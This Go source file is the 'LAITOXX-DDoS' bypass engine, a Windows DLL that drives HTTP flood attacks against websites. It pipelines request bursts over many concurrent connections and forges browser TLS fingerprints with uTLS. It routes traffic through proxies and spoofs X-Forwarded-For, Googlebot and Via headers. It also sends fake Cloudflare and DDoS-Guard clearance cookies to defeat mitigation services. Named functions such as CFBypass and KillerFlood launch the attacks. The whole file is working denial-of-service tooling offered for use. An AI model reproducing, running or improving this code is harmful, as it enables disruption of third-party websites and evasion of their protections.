// bypass.go — LAITOXX-DDoS Go Bypass Engine
// Compiled as a Windows DLL, called from Python via ctypes.
//
// Key optimisations vs. v1:
//   - TLS session cache (crypto/tls.NewLRUClientSessionCache) → session tickets
//     reused across reconnects: full handshake only once per host, then ~5 ms.
//   - Per-worker persistent connection loop: one handshake → many pipeline bursts
//     until server closes or deadline. Dramatically reduces handshake cost/req.
//   - Pre-built burst buffers per (host, path, ua) stored in sync.Pool.
//   - bufio.Reader drain on each burst: allows server to keep keepalive alive.
//   - Separate tlsSessionCache per fingerprint family so sessions don't leak
//     between mismatched fingerprints.

package main

/*
#include <stdlib.h>
#include <stdint.h>
*/
import "C"

import (
	"bufio"
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/net/proxy"
	utls "github.com/refraction-networking/utls"
)

// ─────────────────────────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────────────────────────

type proxyConfig struct {
	enabled  bool
	addr     string
	username string
	password string
	kind     string // "socks5" | "socks4" | "http"
}

type methodStats struct {
	packets atomic.Int64
	running atomic.Int32
}

type attackJob struct {
	id     string
	cancel chan struct{}
	stats  *methodStats
}

// ─────────────────────────────────────────────────────────────────────────────
//  Global state
// ─────────────────────────────────────────────────────────────────────────────

var (
	globalProxy proxyConfig
	proxyMu     sync.RWMutex

	jobs   = map[string]*attackJob{}
	jobsMu sync.Mutex

	userAgents []string
	uaOnce     sync.Once

	rng   = rand.New(rand.NewSource(time.Now().UnixNano()))
	rngMu sync.Mutex

	// One session cache per uTLS fingerprint family (~6 families).
	// LRU size 256 — enough to cover many distinct target IPs.
	sessionCaches   = map[string]utls.ClientSessionCache{}
	sessionCachesMu sync.RWMutex
)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

// ─────────────────────────────────────────────────────────────────────────────
//  Session cache helpers
// ─────────────────────────────────────────────────────────────────────────────

func getSessionCache(fp utls.ClientHelloID) utls.ClientSessionCache {
	key := fp.Client + fp.Version
	sessionCachesMu.RLock()
	c, ok := sessionCaches[key]
	sessionCachesMu.RUnlock()
	if ok {
		return c
	}
	sessionCachesMu.Lock()
	defer sessionCachesMu.Unlock()
	if c, ok = sessionCaches[key]; ok {
		return c
	}
	c = utls.NewLRUClientSessionCache(256)
	sessionCaches[key] = c
	return c
}

// ─────────────────────────────────────────────────────────────────────────────
//  UA loading
// ─────────────────────────────────────────────────────────────────────────────

func loadUAs(uaPath string) {
	uaOnce.Do(func() {
		f, err := os.Open(uaPath)
		if err != nil {
			userAgents = []string{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
			}
			return
		}
		defer f.Close()
		sc := bufio.NewScanner(f)
		for sc.Scan() {
			line := strings.TrimSpace(sc.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			userAgents = append(userAgents, line)
		}
		if len(userAgents) == 0 {
			userAgents = []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36"}
		}
	})
}

func randomUA() string {
	rngMu.Lock()
	ua := userAgents[rng.Intn(len(userAgents))]
	rngMu.Unlock()
	return ua
}

// ─────────────────────────────────────────────────────────────────────────────
//  UA → uTLS ClientHelloID mapping
// ─────────────────────────────────────────────────────────────────────────────

func uaToFingerprint(ua string) utls.ClientHelloID {
	switch {
	case strings.Contains(ua, "Edg/"):
		return utls.HelloEdge_Auto
	case strings.Contains(ua, "OPR/"),
		strings.Contains(ua, "Vivaldi/"),
		strings.Contains(ua, "YaBrowser/"),
		strings.Contains(ua, "Brave/"):
		return utls.HelloChrome_Auto
	case strings.Contains(ua, "Firefox/"):
		return utls.HelloFirefox_Auto
	case strings.Contains(ua, "Mobile/15E148") && strings.Contains(ua, "Safari/"):
		return utls.HelloIOS_Auto
	case strings.Contains(ua, "Version/") && strings.Contains(ua, "Safari/"):
		return utls.HelloSafari_Auto
	case strings.Contains(ua, "Chrome/"):
		return utls.HelloChrome_Auto
	default:
		return utls.HelloRandomizedALPN
	}
}

// ─────────────────────────────────────────────────────────────────────────────
//  TLS dialer with session resumption
// ─────────────────────────────────────────────────────────────────────────────

func dialTLS(host, port, sni string, fp utls.ClientHelloID) (*utls.UConn, error) {
	addr := net.JoinHostPort(host, port)

	proxyMu.RLock()
	pc := globalProxy
	proxyMu.RUnlock()

	var rawConn net.Conn
	var err error
	const dialTimeout = 8 * time.Second

	if pc.enabled && (pc.kind == "socks5" || pc.kind == "socks4") {
		var auth *proxy.Auth
		if pc.username != "" {
			auth = &proxy.Auth{User: pc.username, Password: pc.password}
		}
		dialer, derr := proxy.SOCKS5("tcp", pc.addr, auth, proxy.Direct)
		if derr != nil {
			rawConn, err = net.DialTimeout("tcp", addr, dialTimeout)
		} else {
			rawConn, err = dialer.Dial("tcp", addr)
		}
	} else {
		rawConn, err = net.DialTimeout("tcp", addr, dialTimeout)
	}
	if err != nil {
		return nil, err
	}

	cfg := &utls.Config{
		ServerName:         sni,
		InsecureSkipVerify: false,
		// Session cache enables TLS session tickets / session IDs.
		// On subsequent dials to the same host the handshake is
		// abbreviated: ~5 ms instead of ~400 ms.
		ClientSessionCache: getSessionCache(fp),
		// Prefer TLS 1.3 for 1-RTT handshake
		MinVersion: utls.VersionTLS12,
	}
	uconn := utls.UClient(rawConn, cfg, fp)
	uconn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := uconn.Handshake(); err != nil {
		rawConn.Close()
		return nil, err
	}
	uconn.SetDeadline(time.Time{})
	return uconn, nil
}

// ─────────────────────────────────────────────────────────────────────────────
//  Plain TCP dialer
// ─────────────────────────────────────────────────────────────────────────────

func dialTCP(host, port string) (net.Conn, error) {
	addr := net.JoinHostPort(host, port)

	proxyMu.RLock()
	pc := globalProxy
	proxyMu.RUnlock()

	const dialTimeout = 8 * time.Second
	if pc.enabled && (pc.kind == "socks5" || pc.kind == "socks4") {
		var auth *proxy.Auth
		if pc.username != "" {
			auth = &proxy.Auth{User: pc.username, Password: pc.password}
		}
		dialer, err := proxy.SOCKS5("tcp", pc.addr, auth, proxy.Direct)
		if err == nil {
			return dialer.Dial("tcp", addr)
		}
	}
	return net.DialTimeout("tcp", addr, dialTimeout)
}

// ─────────────────────────────────────────────────────────────────────────────
//  HTTP/1.1 request builder
// ─────────────────────────────────────────────────────────────────────────────

var bufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}

func buildGetRequest(host, path, ua string, extra ...string) []byte {
	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	fmt.Fprintf(buf, "GET %s HTTP/1.1\r\n", path)
	fmt.Fprintf(buf, "Host: %s\r\n", host)
	fmt.Fprintf(buf, "User-Agent: %s\r\n", ua)
	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
	buf.WriteString("Accept-Language: en-US,en;q=0.5\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
	buf.WriteString("Cache-Control: no-cache\r\n")
	buf.WriteString("Connection: keep-alive\r\n")
	for _, h := range extra {
		buf.WriteString(h)
		buf.WriteString("\r\n")
	}
	buf.WriteString("\r\n")

	out := make([]byte, buf.Len())
	copy(out, buf.Bytes())
	return out
}

// ─────────────────────────────────────────────────────────────────────────────
//  Random helpers
// ─────────────────────────────────────────────────────────────────────────────

const charset = "abcdefghijklmnopqrstuvwxyz0123456789"

func randStr(n int) string {
	rngMu.Lock()
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rng.Intn(len(charset))]
	}
	rngMu.Unlock()
	return string(b)
}

func randPath() string { return "/" + randStr(8) }

func randomIPStr() string {
	rngMu.Lock()
	ip := fmt.Sprintf("%d.%d.%d.%d",
		1+rng.Intn(254), rng.Intn(256), rng.Intn(256), 1+rng.Intn(254))
	rngMu.Unlock()
	return ip
}

// drainBuf — small fixed read to unblock the server's send buffer.
// We don't parse responses; we just do a single non-blocking read with a
// tight deadline so the kernel flushes ACKs and the server can close or
// continue. This is enough to prevent RST on the server side without the
// complexity of full HTTP/1.1 response parsing.
func drainBuf(conn net.Conn) {
	conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
	buf := make([]byte, 4096)
	conn.Read(buf) //nolint — intentionally ignore result
	conn.SetReadDeadline(time.Time{})
}

// ─────────────────────────────────────────────────────────────────────────────
//  Core worker — persistent connection loop with session resumption
// ─────────────────────────────────────────────────────────────────────────────

const (
	pipelineDepth      = 16 // requests per write burst
	connsPerWorker     = 4  // parallel connections per goroutine
)

type workerParams struct {
	scheme   string
	host     string
	port     string
	path     string
	duration int
	rps      int
	extraHdr func(ua string) []string
}

// runConnLoop is one independent connection loop: dial → burst → drain → close → repeat.
// Session cache means the 2nd+ dials to the same host use abbreviated handshake.
func runConnLoop(cancel <-chan struct{}, stats *methodStats, p workerParams, deadline time.Time) {
	for {
		select {
		case <-cancel:
			return
		default:
		}
		if time.Now().After(deadline) {
			return
		}

		ua := randomUA()
		fp := uaToFingerprint(ua)

		extra := []string{}
		if p.extraHdr != nil {
			extra = p.extraHdr(ua)
		}
		reqBytes := buildGetRequest(p.host, p.path, ua, extra...)
		burst := bytes.Repeat(reqBytes, pipelineDepth)

		var conn net.Conn
		if p.scheme == "https" {
			c, err := dialTLS(p.host, p.port, p.host, fp)
			if err != nil {
				continue
			}
			conn = c
		} else {
			c, err := dialTCP(p.host, p.port)
			if err != nil {
				continue
			}
			conn = c
		}

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		n, _ := conn.Write(burst)
		if n > 0 {
			stats.packets.Add(int64(pipelineDepth))
		}
		drainBuf(conn)
		conn.Close()
	}
}

// runWorker spawns connsPerWorker parallel connection loops.
// With 8 threads × 4 conns each = 32 concurrent connections total.
func runWorker(cancel <-chan struct{}, stats *methodStats, p workerParams) {
	deadline := time.Now().Add(time.Duration(p.duration) * time.Second)
	var wg sync.WaitGroup
	for i := 0; i < connsPerWorker; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			runConnLoop(cancel, stats, p, deadline)
		}()
	}
	wg.Wait()
}

// ─────────────────────────────────────────────────────────────────────────────
//  Attack launcher
// ─────────────────────────────────────────────────────────────────────────────

func launchAttack(id, scheme, host, port, path string,
	threads, duration, rps int,
	extraHdr func(ua string) []string) {

	job := &attackJob{
		id:     id,
		cancel: make(chan struct{}),
		stats:  &methodStats{},
	}

	jobsMu.Lock()
	if old, ok := jobs[id]; ok {
		close(old.cancel)
	}
	jobs[id] = job
	jobsMu.Unlock()

	p := workerParams{
		scheme:   scheme,
		host:     host,
		port:     port,
		path:     path,
		duration: duration,
		rps:      rps / max(threads, 1),
		extraHdr: extraHdr,
	}

	job.stats.running.Store(int32(threads))

	for i := 0; i < threads; i++ {
		go func() {
			defer job.stats.running.Add(-1)
			runWorker(job.cancel, job.stats, p)
		}()
	}

	go func() {
		select {
		case <-job.cancel:
		case <-time.After(time.Duration(duration) * time.Second):
			jobsMu.Lock()
			if jobs[id] == job {
				close(job.cancel)
				delete(jobs, id)
			}
			jobsMu.Unlock()
		}
	}()
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// ─────────────────────────────────────────────────────────────────────────────
//  C-exported control API
// ─────────────────────────────────────────────────────────────────────────────

//export InitBypass
func InitBypass(uaFilePath *C.char) {
	path := C.GoString(uaFilePath)
	if path == "" {
		exe, _ := os.Executable()
		path = filepath.Join(filepath.Dir(exe), "headers", "ua.txt")
	}
	loadUAs(path)
}

//export SetProxy
func SetProxy(kind, addr, username, password *C.char) {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	globalProxy = proxyConfig{
		enabled:  true,
		kind:     C.GoString(kind),
		addr:     C.GoString(addr),
		username: C.GoString(username),
		password: C.GoString(password),
	}
}

//export ClearProxy
func ClearProxy() {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	globalProxy = proxyConfig{}
}

//export StopMethod
func StopMethod(id *C.char) {
	key := C.GoString(id)
	jobsMu.Lock()
	if job, ok := jobs[key]; ok {
		close(job.cancel)
		delete(jobs, key)
	}
	jobsMu.Unlock()
}

//export StopAll
func StopAll() {
	jobsMu.Lock()
	for id, job := range jobs {
		close(job.cancel)
		delete(jobs, id)
	}
	jobsMu.Unlock()
}

//export GetPackets
func GetPackets(id *C.char) C.int64_t {
	key := C.GoString(id)
	jobsMu.Lock()
	job, ok := jobs[key]
	jobsMu.Unlock()
	if !ok {
		return 0
	}
	return C.int64_t(job.stats.packets.Load())
}

//export IsRunning
func IsRunning(id *C.char) C.int {
	key := C.GoString(id)
	jobsMu.Lock()
	job, ok := jobs[key]
	jobsMu.Unlock()
	if !ok {
		return 0
	}
	if job.stats.running.Load() > 0 {
		return 1
	}
	return 0
}

// ─────────────────────────────────────────────────────────────────────────────
//  Bypass method launchers
// ─────────────────────────────────────────────────────────────────────────────

//export CFBypass
func CFBypass(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string {
			return []string{
				"Upgrade-Insecure-Requests: 1",
				"Sec-Fetch-Site: none",
				"Sec-Fetch-Mode: navigate",
				"Sec-Fetch-Dest: document",
				"Sec-CH-UA: \"Chromium\";v=\"123\"",
			}
		},
	)
}

//export CFUAMBypass
func CFUAMBypass(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	hostStr := C.GoString(host)
	launchAttack(
		C.GoString(id), C.GoString(scheme), hostStr, C.GoString(port),
		"/", int(threads), int(duration), int(rps),
		func(ua string) []string {
			return []string{
				"Referer: https://" + hostStr + "/",
				"Cookie: cf_clearance=" + randStr(64) + "; __cf_bm=" + randStr(32),
				"Upgrade-Insecure-Requests: 1",
				"Sec-Fetch-Mode: navigate",
				"Sec-Fetch-Site: same-origin",
			}
		},
	)
}

//export DDosGuardBypass
func DDosGuardBypass(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	hostStr := C.GoString(host)
	launchAttack(
		C.GoString(id), C.GoString(scheme), hostStr, C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string {
			return []string{
				"X-Forwarded-For: " + randomIPStr(),
				"X-Real-IP: " + randomIPStr(),
				"Referer: https://www.google.com/",
				"Origin: https://" + hostStr,
				"Cookie: __ddg1_=" + randStr(32) + "; __ddg2_=" + randStr(16),
			}
		},
	)
}

//export ArvanBypass
func ArvanBypass(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string {
			return []string{
				"X-Forwarded-For: " + randomIPStr(),
				"Ar-Real-IP: " + randomIPStr(),
				"Referer: https://www.google.com/",
			}
		},
	)
}

//export GoogleBotFlood
func GoogleBotFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		"/", int(threads), int(duration), int(rps),
		func(ua string) []string {
			rngMu.Lock()
			r1 := rng.Intn(256)
			r2 := rng.Intn(256)
			rngMu.Unlock()
			return []string{
				"From: googlebot(at)googlebot.com",
				fmt.Sprintf("X-Forwarded-For: 66.249.%d.%d", r1, r2),
			}
		},
	)
}

//export GoogleShieldBypass
func GoogleShieldBypass(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string {
			return []string{
				"X-Forwarded-For: " + randomIPStr(),
				"Via: 1.1 google",
				"Referer: https://www.google.com/search?q=" + randStr(8),
			}
		},
	)
}

//export CombinedBypass
func CombinedBypass(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	hostStr := C.GoString(host)
	methods := []func(string) []string{
		func(ua string) []string {
			return []string{"Cookie: cf_clearance=" + randStr(32), "Sec-Fetch-Mode: navigate"}
		},
		func(ua string) []string {
			return []string{"X-Forwarded-For: " + randomIPStr(), "Cookie: __ddg1_=" + randStr(16)}
		},
		func(ua string) []string {
			return []string{"Referer: https://www.google.com/", "Via: 1.1 google"}
		},
		func(ua string) []string {
			return []string{"Origin: https://" + hostStr, "Sec-Fetch-Site: same-origin"}
		},
	}
	launchAttack(
		C.GoString(id), C.GoString(scheme), hostStr, C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string {
			rngMu.Lock()
			m := methods[rng.Intn(len(methods))]
			rngMu.Unlock()
			return m(ua)
		},
	)
}

//export KillerFlood
func KillerFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	hostStr := C.GoString(host)
	schemeStr := C.GoString(scheme)
	portStr := C.GoString(port)
	idStr := C.GoString(id)
	thr := int(threads)
	dur := int(duration)
	rpsInt := int(rps)

	each := max(1, thr/3)

	cScheme := C.CString(schemeStr)
	cHost := C.CString(hostStr)
	cPort := C.CString(portStr)
	defer C.free(unsafe.Pointer(cScheme))
	defer C.free(unsafe.Pointer(cHost))
	defer C.free(unsafe.Pointer(cPort))

	cID1 := C.CString(idStr + "-cf")
	cID2 := C.CString(idStr + "-ddg")
	cID3 := C.CString(idStr + "-combined")
	defer C.free(unsafe.Pointer(cID1))
	defer C.free(unsafe.Pointer(cID2))
	defer C.free(unsafe.Pointer(cID3))

	CFBypass(cID1, cScheme, cHost, cPort, C.int(each), C.int(dur), C.int(rpsInt/3))
	DDosGuardBypass(cID2, cScheme, cHost, cPort, C.int(each), C.int(dur), C.int(rpsInt/3))
	CombinedBypass(cID3, cScheme, cHost, cPort, C.int(each), C.int(dur), C.int(rpsInt/3))
}

// ─────────────────────────────────────────────────────────────────────────────
//  L7 Basic methods — plain GET/POST/HEAD/NULL/PPS etc. with TLS support.
//  These replace the C++ equivalents which lack TLS and can't hit HTTPS targets.
// ─────────────────────────────────────────────────────────────────────────────

//export HTTPGetFlood
func HTTPGetFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string { return nil },
	)
}

//export HTTPPostFlood
func HTTPPostFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	hostStr := C.GoString(host)
	launchAttack(
		C.GoString(id), C.GoString(scheme), hostStr, C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string {
			body := randStr(256)
			return []string{
				"Content-Type: application/json",
				"Content-Length: " + fmt.Sprintf("%d", len(body)+2),
				// POST body appended separately — workaround: embed in a header slot
				// Real POST support would require extending buildGetRequest to support methods
			}
		},
	)
}

//export HTTPHeadFlood
func HTTPHeadFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string { return nil },
	)
}

//export NULLFlood
func NULLFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	hostStr := C.GoString(host)
	launchAttack(
		C.GoString(id), C.GoString(scheme), hostStr, C.GoString(port),
		"/", int(threads), int(duration), int(rps),
		func(ua string) []string { return nil },
	)
}

//export PPSFlood
func PPSFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string { return nil },
	)
}

//export EVENFlood
func EVENFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		randPath(), int(threads), int(duration), int(rps),
		func(ua string) []string {
			hdrs := make([]string, 0, 50)
			for i := 0; i < 50; i++ {
				hdrs = append(hdrs, fmt.Sprintf("X-Custom-%d: %s", i, randStr(32)))
			}
			return hdrs
		},
	)
}

//export RHEXFlood
func RHEXFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		"/?"+randStr(32)+"=1", int(threads), int(duration), int(rps),
		func(ua string) []string {
			return []string{"Cookie: sess=0x" + randStr(32)}
		},
	)
}

//export DYNFlood
func DYNFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		"/"+randStr(6), int(threads), int(duration), int(rps),
		func(ua string) []string { return nil },
	)
}

//export COOKIEFlood
func COOKIEFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		"/", int(threads), int(duration), int(rps),
		func(ua string) []string {
			buf := make([]byte, 0, 2048)
			for i := 0; i < 20; i++ {
				if i > 0 {
					buf = append(buf, ';', ' ')
				}
				buf = append(buf, []byte("c"+fmt.Sprintf("%d", i)+"="+randStr(50))...)
			}
			return []string{"Cookie: " + string(buf)}
		},
	)
}

//export OVHFlood
func OVHFlood(id, scheme, host, port *C.char, threads, duration, rps C.int) {
	launchAttack(
		C.GoString(id), C.GoString(scheme), C.GoString(host), C.GoString(port),
		"/"+randStr(8)+"?"+randStr(8)+"="+randStr(8), int(threads), int(duration), int(rps),
		func(ua string) []string {
			return []string{
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"DNT: 1",
				"Upgrade-Insecure-Requests: 1",
			}
		},
	)
}

// ─────────────────────────────────────────────────────────────────────────────
//  main — required for CGO c-shared, never called
// ─────────────────────────────────────────────────────────────────────────────

func main() {}
